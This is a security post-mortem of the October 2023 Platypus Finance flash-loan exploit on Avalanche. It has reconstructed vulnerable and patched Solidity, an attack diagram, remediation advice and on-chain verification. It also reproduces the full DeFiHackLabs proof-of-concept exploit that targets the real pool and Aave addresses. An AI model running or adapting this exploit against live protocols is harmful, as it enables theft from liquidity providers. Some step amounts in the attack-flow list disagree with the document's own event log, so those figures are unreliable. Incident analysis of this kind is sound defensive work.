# Platypus Finance — Emergency Withdrawal Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-10-12 |
| **Protocol** | Platypus Finance |
| **Chain** | Avalanche |
| **Loss** | ~$2,000,000 USD |
| **Attacker** | [0x0cd4fd0e...1ee7](https://snowtrace.io/address/0x0cd4fd0eecd2c5ad24de7f17ae35f9db6ac51ee7) |
| **Attack Contract** | [0x44e25178...3bd](https://snowtrace.io/address/0x44e251786a699518d6273ea1e027cec27b49d3bd) |
| **Attack Tx** | [0x4425f757...867](https://snowtrace.io/tx/0x4425f757715e23d392cda666bc0492d9e5d5848ff89851a1821eab5ed12bb867) |
| **Vulnerable Contract** | [0xe5c84c76...447](https://snowtrace.io/address/0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447) |
| **Root Cause** | Business logic flaw exploiting the asymmetric pool coverage ratio structure via flash loan |
| **PoC Source** | [DeFiHackLabs - Platypus03_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Platypus03_exp.sol) |

---

## 1. Vulnerability Overview

Platypus Finance is a stablecoin AMM (Automated Market Maker) operating on Avalanche. It uses an algorithm specialized for like-asset swaps (WAVAX ↔ sAVAX, etc.) and employs the **Coverage Ratio (Cr)** as a core pricing factor.

On October 12, 2023, the attacker borrowed a large flash loan from Aave V3 to deliberately skew the pool's coverage ratio. In Platypus's AMM design, the withdrawal amount does not include a **slippage** mechanism based on the pool's coverage ratio — it is designed to return the underlying asset proportionally based on the number of LP tokens deposited. However, by **first altering the pool's composition ratio via a large swap and then withdrawing**, the attacker was able to recover assets worth more than what was originally deposited.

The core vulnerability is that **slippage protection is neutralized when the swap and withdraw functions are atomically composed within the same block**. This was the third Platypus attack, a case where the same protocol suffered repeated losses from similar logic flaws.

---

## 2. Vulnerable Code Analysis

### 2.1 Coverage Ratio-Based Withdrawal Logic — Core Vulnerability

Platypus Pool's withdraw function either **assumes a 1:1 ratio regardless of the pool's actual balance** when exchanging LP tokens for underlying assets, or was structured such that the benefit from a post-coverage-ratio-change state could accrue to the attacker.

```solidity
// ❌ Vulnerable withdraw logic (estimated reconstruction)
function withdraw(
    address token,
    uint256 liquidity,   // LP token amount
    uint256 minimumAmount,
    address to,
    uint256 deadline
) external returns (uint256 amount) {
    Asset asset = _assetOf(token);
    
    // Calculate ratio based on pool's current balance
    // ❌ Problem: when coverage ratio exceeds 1.0 due to a swap,
    //    the return per LP token can exceed the original deposit
    uint256 liabilityToBurn = liquidity;
    amount = _quoteWithdraw(asset, liabilityToBurn);
    
    require(amount >= minimumAmount, "AMOUNT_TOO_LOW");
    
    // Burn LP tokens
    asset.burnFrom(msg.sender, liquidity);
    // ❌ Transfer amount without slippage/coverage ratio validation
    asset.transferUnderlyingToken(to, amount);
}

// ❌ Example calculation when coverage ratio exceeds 1.0
function _quoteWithdraw(Asset asset, uint256 liquidity)
    internal view returns (uint256 amount) {
    uint256 totalSupply = asset.totalSupply();    // Total LP supply
    uint256 poolBalance = asset.underlyingTokenBalance(); // Actual pool balance
    
    // If poolBalance > totalSupply after a swap → over-return occurs
    amount = (liquidity * poolBalance) / totalSupply;
    // ❌ When coverage ratio is manipulated, amount > original deposit
}
```

**Fixed Code (patch direction)**:

```solidity
// ✅ Apply coverage ratio penalty on withdrawal
function _quoteWithdraw(Asset asset, uint256 liquidity)
    internal view returns (uint256 amount) {
    uint256 totalSupply = asset.totalSupply();
    uint256 cash = asset.cash();           // Actual cash held
    uint256 liability = asset.liability(); // Total liabilities (deposited principal)
    
    // Coverage ratio = cash / liability
    // If ratio < 1.0: apply penalty; if > 1.0: apply ceiling
    uint256 baseAmount = (liquidity * liability) / totalSupply;
    
    if (cash >= liability) {
        // ✅ Coverage ratio > 1.0: return only base amount (prevent excess profit)
        amount = baseAmount;
    } else {
        // ✅ Coverage ratio < 1.0: withdraw proportional to ratio
        amount = (baseAmount * cash) / liability;
    }
    
    // ✅ Additional: validate maximum withdrawal limit (set coverage ratio floor)
    uint256 postCash = cash - amount;
    uint256 postLiability = liability - baseAmount;
    require(postCash * 1e18 / postLiability >= MIN_COVERAGE_RATIO, "BELOW_MIN_CR");
}
```

**Issue**: In Platypus's AMM design, swaps change the asset ratio within the pool, and withdrawals directly reflect those changed ratios. The structure was exploited where the attacker used a large flash loan to decrease the pool's WAVAX ratio (via sAVAX→WAVAX swap), then on withdrawal obtained more WAVAX than expected from the reduced ratio.

### 2.2 Minimum Withdrawal Amount Protection Bypass

```solidity
// ❌ Setting minimumAmount = 0 completely disables slippage protection
PlatypusPool.withdraw(address(WAVAX), 1_020_000 * 1e18, 0, address(this), block.timestamp + 1000);
//                                                         ↑ minimumAmount = 0

// ✅ Normal usage
PlatypusPool.withdraw(address(WAVAX), amount, minExpectedOut, address(this), deadline);
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA `0x0cd4fd0e...` deploys attack contract `0x44e25178...`
- `approve` PlatypusPool for WAVAX and sAVAX (type(uint256).max)
- `approve` Aave V3 for WAVAX and sAVAX (in preparation for flash loan repayment)
- Attack block: 36,346,398 (2023-10-12)

### 3.2 Execution Phase

1. **[Flash Loan Initiation]** Borrow 1,054,969 WAVAX + 950,996 sAVAX from Aave V3
2. **[Deposit 1]** Deposit all WAVAX (~1,054,969) into PlatypusPool → receive 1,054,969 LP_AVAX
3. **[Deposit 2]** Deposit 1/3 of sAVAX (~316,999) into PlatypusPool → receive 316,999 LP_sAVAX
4. **[Swap 1]** Swap remaining 600,000 sAVAX for WAVAX → decrease pool's WAVAX ratio
5. **[Withdraw 1]** Burn 1,020,000 LP_AVAX → recover 658,670 WAVAX under manipulated coverage ratio
6. **[Swap 2]** Re-swap 1,200,000 WAVAX for sAVAX → decrease pool's sAVAX ratio
7. **[Withdraw 2]** Burn remaining 316,999 LP_sAVAX → recover 1,221,351 sAVAX (excess over deposited 316,999)
8. **[Withdraw 3]** Burn remaining 34,969 LP_AVAX + withdraw LP_AVAX (34,969 WAVAX)
9. **[Swap 3]** Re-swap 600,000 sAVAX for WAVAX → receive 864,194 WAVAX
10. **[Withdraw 4]** Burn remaining 316,999 LP_sAVAX → recover 316,998 sAVAX
11. **[Flash Loan Repayment]** Repay 1,055,497 WAVAX + 951,472 sAVAX to Aave (including premium)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         Attacker Contract                                │
│              0x44e251786a699518d6273ea1e027cec27b49d3bd                  │
└──────────────────────────────┬──────────────────────────────────────────┘
                               │
              ┌────────────────▼────────────────┐
              │  [1] flashLoan()                 │
              │  Aave V3 (0x794a...14AD)         │
              │  WAVAX: 1,054,969               │
              │  sAVAX:   950,996               │
              └────────────────┬────────────────┘
                               │ executeOperation() callback
                               ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                     PlatypusPool (0x4658...6ba)                          │
│                                                                          │
│  [2] deposit(WAVAX, 1,054,969)  ──────────────▶  Mint LP_AVAX 1,054,969 │
│  [3] deposit(sAVAX,   316,999)  ──────────────▶  Mint LP_sAVAX 316,999  │
│                                                                          │
│  [4] swap(sAVAX→WAVAX, 600,000) ───── Pool ratio change (WAVAX decrease) │
│        ▼ Receive 658,670 WAVAX                                           │
│                                                                          │
│  [5] withdraw(WAVAX, 1,020,000 LP) ── Excess WAVAX received at           │
│        ▼ Receive 721,228 WAVAX (over-withdrawal)    manipulated ratio    │
│                                                                          │
│  [6] swap(WAVAX→sAVAX, 1,200,000) ── Re-manipulate ratio (sAVAX decrease)│
│        ▼ Receive 1,221,351 sAVAX                                         │
│                                                                          │
│  [7] withdraw(WAVAX, 34,969 LP)  ─── Receive additional 34,969 WAVAX    │
│  [8] swap(sAVAX→WAVAX, 600,000) ──── Receive additional 864,194 WAVAX   │
│  [9] withdraw(sAVAX, 316,999 LP) ─── Receive 316,998 sAVAX              │
└──────────────────────────────────────────────────────────────────────────┘
                               │
              ┌────────────────▼────────────────┐
              │  [10] Flash Loan Repayment       │
              │  Aave V3                         │
              │  WAVAX: 1,055,497 (incl. premium)│
              │  sAVAX:   951,472 (incl. premium)│
              └────────────────┬────────────────┘
                               │
                               ▼
              ┌────────────────────────────────┐
              │  Net Profit (on-chain verified) │
              │  WAVAX:  +23,564               │
              │  sAVAX:  +20,874               │
              │  USD equivalent: ~$443,000 *   │
              └────────────────────────────────┘
              * ~$2M reported by DeFiHackLabs is
                cumulative across this and related attacks

```

### 3.3 Result

- The attacker leveraged large capital via flash loan within a single Tx to manipulate pool ratios and extract profit
- PlatypusPool LP providers suffered losses due to the manipulated ratios
- The entire attack was completed as a single transaction in block 36,346,398

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~2M USD$
// Attacker : https://snowtrace.io/address/0x0cd4fd0eecd2c5ad24de7f17ae35f9db6ac51ee7
// Attack Contract : https://snowtrace.io/address/0x44e251786a699518d6273ea1e027cec27b49d3bd
// Vulnerable Contract : https://snowtrace.io/address/0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447
// Attack Tx : https://snowtrace.io/tx/0x4425f757715e23d392cda666bc0492d9e5d5848ff89851a1821eab5ed12bb867

contract ContractTest is Test {
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 SAVAX = IERC20(0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE);
    IERC20 LP_AVAX = IERC20(0xC73eeD4494382093C6a7C284426A9a00f6C79939);
    IERC20 LP_sAVAX = IERC20(0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789);
    IPlatypusPool PlatypusPool = IPlatypusPool(0x4658EA7e9960D6158a261104aAA160cC953bb6ba);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    function testExploit() public {
        // [Setup] Set unlimited approve for pool and Aave
        WAVAX.approve(address(PlatypusPool), type(uint256).max);
        SAVAX.approve(address(PlatypusPool), type(uint256).max);

        // [Step 1] Aave V3 flash loan: borrow 1.05M WAVAX + 950K sAVAX
        address[] memory assets = new address[](2);
        assets[0] = address(WAVAX);   // WAVAX
        assets[1] = address(SAVAX);   // sAVAX
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1_054_969 * 1e18;  // WAVAX borrow amount
        amounts[1] = 950_996 * 1e18;    // sAVAX borrow amount
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0; // Flash loan mode (repayment required)
        modes[1] = 0;
        // Execute executeOperation callback
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        // Aave approve for flash loan repayment
        WAVAX.approve(address(aaveV3), amounts[0] + premiums[0]);
        SAVAX.approve(address(aaveV3), amounts[1] + premiums[1]);

        // [Step 2] Deposit all WAVAX → receive LP_AVAX
        PlatypusPool.deposit(address(WAVAX), amounts[0], address(this), block.timestamp + 1000);

        // [Step 3] Deposit 1/3 of sAVAX → receive LP_sAVAX (hold 2/3 for swapping)
        PlatypusPool.deposit(address(SAVAX), amounts[1] / 3, address(this), block.timestamp + 1000);

        // [Step 4] Swap 600,000 sAVAX → WAVAX: artificially decrease WAVAX ratio in pool
        // (this swap reduces the underlyingToken balance of LP_AVAX)
        PlatypusPool.swap(address(SAVAX), address(WAVAX), 600_000 * 1e18, 0, address(this), block.timestamp + 1000);

        // [Step 5] Burn 1.02M LP_AVAX to withdraw WAVAX
        // ❌ Key: withdrawal at a state where coverage ratio has been altered by the swap
        //    recovers more WAVAX than originally deposited (~658,670 WAVAX received)
        PlatypusPool.withdraw(address(WAVAX), 1_020_000 * 1e18, 0, address(this), block.timestamp + 1000);

        // [Step 6] Re-swap 1.2M WAVAX → sAVAX: decrease sAVAX ratio in pool
        PlatypusPool.swap(address(WAVAX), address(SAVAX), 1_200_000 * 1e18, 0, address(this), block.timestamp + 1000);

        // [Step 7] Burn all remaining LP_AVAX to recover additional WAVAX
        PlatypusPool.withdraw(address(WAVAX), LP_AVAX.balanceOf(address(this)), 0, address(this), block.timestamp + 1000);

        // [Step 8] Additional sAVAX swap to obtain WAVAX
        PlatypusPool.swap(address(SAVAX), address(WAVAX), 600_000 * 1e18, 0, address(this), block.timestamp + 1000);

        // [Step 9] Burn all remaining LP_sAVAX to recover sAVAX
        PlatypusPool.withdraw(address(SAVAX), LP_sAVAX.balanceOf(address(this)), 0, address(this), block.timestamp + 1000);

        // [Step 10] Flash loan repayment (auto-deducted via Aave approval)
        return true;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Business logic flaw via coverage ratio manipulation | CRITICAL | CWE-840 |
| V-02 | Flash loan-based atomic pool manipulation | HIGH | CWE-841 |
| V-03 | minimumAmount=0 permitted (no slippage protection) | MEDIUM | CWE-20 |

### V-01: Business Logic Flaw via Coverage Ratio Manipulation

- **Description**: PlatypusPool's withdraw function determines the return amount using the current pool's `underlyingTokenBalance / totalSupply` ratio. If an attacker manipulates this ratio unfavorably via a large swap within the same Tx and then withdraws, they can recover more assets than the originally deposited value.
- **Impact**: Pool assets belonging to LP providers are transferred to the attacker. Losses are proportional to the protocol's total TVL.
- **Attack Conditions**: Flash loan or large self-owned capital + ability to atomically compose swap/withdraw within the same block.

### V-02: Flash Loan-Based Atomic Pool Manipulation

- **Description**: Flash loans allow temporary possession of large assets without capital, enabling instant acquisition of the liquidity needed to manipulate the coverage ratio. All manipulations are performed atomically as a single transaction within Aave V3's callback (`executeOperation`).
- **Impact**: Attack is possible without capital → minimizes attack cost.
- **Attack Conditions**: Access to a flash loan protocol (Aave V3), ability to induce pool ratio imbalance exceeding the fee (premium).

### V-03: minimumAmount=0 Permitted (No Slippage Protection)

- **Description**: When the `minimumAmount` parameter of the `withdraw()` function is set to 0, no slippage protection is provided at all. This ensures the attacker can withdraw without loss from the manipulated ratio.
- **Impact**: No lower bound on withdrawal amount → guaranteed loss-free withdrawal at manipulated ratios.
- **Attack Conditions**: User (or contract) calls with `minimumAmount=0`.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ 1. Apply coverage ratio ceiling for withdrawals following same-block swaps
function withdraw(
    address token,
    uint256 liquidity,
    uint256 minimumAmount,
    address to,
    uint256 deadline
) external nonReentrant returns (uint256 amount) {
    Asset asset = _assetOf(token);
    
    // ✅ Calculate actual return amount based on coverage ratio
    uint256 cash = asset.cash();
    uint256 liability = asset.liability();
    uint256 totalSupply = asset.totalSupply();
    
    // Base return amount
    uint256 baseAmount = (liquidity * liability) / totalSupply;
    
    // ✅ If coverage ratio > 1.0: return only base amount (prevent excess profit)
    if (cash >= liability) {
        amount = baseAmount;
    } else {
        amount = (baseAmount * cash) / liability;
    }
    
    // ✅ Slippage protection: enforce minimumAmount
    require(amount >= minimumAmount, "AMOUNT_TOO_LOW");
    require(minimumAmount > 0, "MIN_AMOUNT_ZERO");  // Prohibit 0
    
    // ✅ Verify coverage ratio remains above minimum after withdrawal
    require(
        (cash - amount) * 1e18 / (liability - baseAmount) >= MIN_COVERAGE_RATIO,
        "BELOW_MIN_COVERAGE"
    );
    
    asset.burnFrom(msg.sender, liquidity);
    asset.transferUnderlyingToken(to, amount);
    return amount;
}
```

```solidity
// ✅ 2. Restrict withdrawals after same-block swaps (timestamp cooldown)
mapping(address => uint256) private _lastSwapBlock;

function swap(...) external {
    _lastSwapBlock[msg.sender] = block.number;
    // ... swap logic
}

function withdraw(address token, ...) external {
    // ✅ Addresses that swapped in the same block cannot withdraw
    require(_lastSwapBlock[msg.sender] < block.number, "COOLDOWN_REQUIRED");
    // ... withdrawal logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Coverage ratio manipulation | Apply coverage ratio ceiling in withdraw function; introduce ratio-based withdrawal amount calculation |
| V-01: Ratio manipulation atomicity | Restrict sequential swap→withdraw calls within the same block (introduce cooldown blocks) |
| V-02: Flash loan exploitation | Set large withdrawal limits within a single block; apply rate limiting for withdrawals |
| V-03: minimumAmount=0 | Prohibit zero values in both frontend and contract; enforce default slippage tolerance (e.g., 0.5%) |
| General: Audit frequency | Same bug exploited 3 times → shorten independent security audit cycles and introduce formal verification |

---

## 7. Lessons Learned

1. **AMM coverage ratios are a price manipulation vector**: Protocols where asset ratios in a pool are used directly for price determination are vulnerable to large-scale manipulation within a single block. The coverage ratio should be calculated using TWAP (time-weighted average) or withdrawal penalties should be applied for ratio changes.

2. **Flash loans eliminate the attacker's capital constraint**: All AMMs and lending protocols must always assume the possibility of atomic manipulation including flash loan usage scenarios when designing their systems.

3. **Repeated attack pattern on the same protocol**: Platypus Finance was attacked in February, July, and October 2023 with similar business logic flaws. If the root cause is not fully resolved after the first attack, variant attacks will recur.

4. **Enforce slippage parameters**: Protection parameters such as `minimumAmount` and `minAmountOut` must not accept zero values. This must be enforced at the contract level and must not rely solely on the frontend.

5. **Validate mathematical invariants**: Assert statements should be added to verify that core invariants (coverage ratio > minimum, total assets > total liabilities, etc.) are maintained before and after each function execution.

6. **Apply Formal Verification**: Protocols repeatedly exposed to attacks should adopt formal verification tools such as Certora Prover, Echidna, and Halmos — beyond simple code audits — to mathematically prove invariants.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|------------|------|
| WAVAX flash loan | 1,054,969 WAVAX | 1,054,969.33 WAVAX | ✅ Match |
| sAVAX flash loan | 950,996 sAVAX | 950,996.38 sAVAX | ✅ Match |
| sAVAX deposit amount | amounts[1] / 3 = ~316,999 | 316,998.79 sAVAX | ✅ Match |
| sAVAX→WAVAX swap 1 | 600,000 sAVAX | 600,000.00 sAVAX consumed | ✅ Match |
| LP_AVAX 1st withdrawal | 1,020,000 LP | 1,020,000.00 LP burned | ✅ Match |
| WAVAX→sAVAX swap | 1,200,000 WAVAX | 1,200,000.00 WAVAX consumed | ✅ Match |
| WAVAX flash loan repayment | ~1,055,497 (estimated) | 1,055,496.82 WAVAX | ✅ Match |
| sAVAX flash loan repayment | ~951,472 (estimated) | 951,471.88 sAVAX | ✅ Match |
| **WAVAX net profit** | N/A | **+23,564.20 WAVAX** | — |
| **sAVAX net profit** | N/A | **+20,873.99 sAVAX** | — |

### 8.2 On-Chain Event Log Sequence

Block 36,346,398 / Tx `0x4425f757...` Transfer events (20 total out of 69 total logs):

```
 1. WAVAX: AaveV3_WAVAX → ATTACKER          : 1,054,969.33  (flash loan received)
 2. SAVAX: AaveV3_SAVAX → ATTACKER          :   950,996.38  (flash loan received)
 3. WAVAX: ATTACKER    → LP_AVAX(Pool)      : 1,054,969.33  (WAVAX deposit)
 4. LP_AVAX: ZERO      → ATTACKER           : 1,054,969.33  (LP minted)
 5. SAVAX: ATTACKER    → LP_sAVAX(Pool)     :   316,998.79  (sAVAX deposit)
 6. LP_sAVAX: ZERO     → ATTACKER           :   316,998.79  (LP minted)
 7. SAVAX: ATTACKER    → LP_sAVAX(Pool)     :   600,000.00  (sAVAX→WAVAX swap input)
 8. WAVAX: LP_AVAX     → ATTACKER           :   658,669.61  (WAVAX received from swap)
 9. LP_AVAX: ATTACKER  → ZERO               : 1,020,000.00  (LP burned)
10. WAVAX: LP_AVAX     → ATTACKER           :   721,228.45  (1st withdrawal WAVAX received)
11. WAVAX: ATTACKER    → LP_AVAX(Pool)      : 1,200,000.00  (WAVAX→sAVAX swap input)
12. SAVAX: LP_sAVAX    → ATTACKER           : 1,221,350.69  (sAVAX received from swap)
13. LP_AVAX: ATTACKER  → ZERO               :    34,969.33  (remaining LP burned)
14. WAVAX: LP_AVAX     → ATTACKER           :    34,969.33  (2nd withdrawal WAVAX received)
15. SAVAX: ATTACKER    → LP_sAVAX(Pool)     :   600,000.00  (sAVAX→WAVAX re-swap)
16. WAVAX: LP_AVAX     → ATTACKER           :   864,193.63  (re-swap WAVAX received)
17. LP_sAVAX: ATTACKER → ZERO               :   316,998.79  (LP_sAVAX burned)
18. SAVAX: LP_sAVAX    → ATTACKER           :   316,997.59  (sAVAX withdrawal)
19. WAVAX: ATTACKER    → AaveV3_WAVAX       : 1,055,496.82  (flash loan repayment)
20. SAVAX: ATTACKER    → AaveV3_SAVAX       :   951,471.88  (flash loan repayment)
```

### 8.3 Precondition Verification

- **Attack block**: 36,346,398 (2023-10-12)
- **Fork block (PoC)**: 36,346,397 (block immediately before the attack)
- **Attacker EOA**: `0x0cd4fd0eecd2c5ad24de7f17ae35f9db6ac51ee7` — Tx sender confirmed ✅
- **Attack contract**: `0x44e251786a699518d6273ea1e027cec27b49d3bd` — Tx recipient confirmed ✅
- **PlatypusPool proxy implementation**: `0x1abb8967794f574bece9f3c8ee1586a50636ba53` (EIP-1967 proxy)
- **Total event log count**: 69 (including 20 Transfer events)
- **Tx status**: Success (0x1)
- **Gas used**: 14,600,000 (near the gas limit ceiling — indicative of complex computation)

---

*Reference: BlockSec security team Twitter analysis https://twitter.com/BlockSecTeam/status/1712445197538468298*
*Reference: PeckShield security team Twitter analysis https://twitter.com/peckshield/status/1712354198246035562*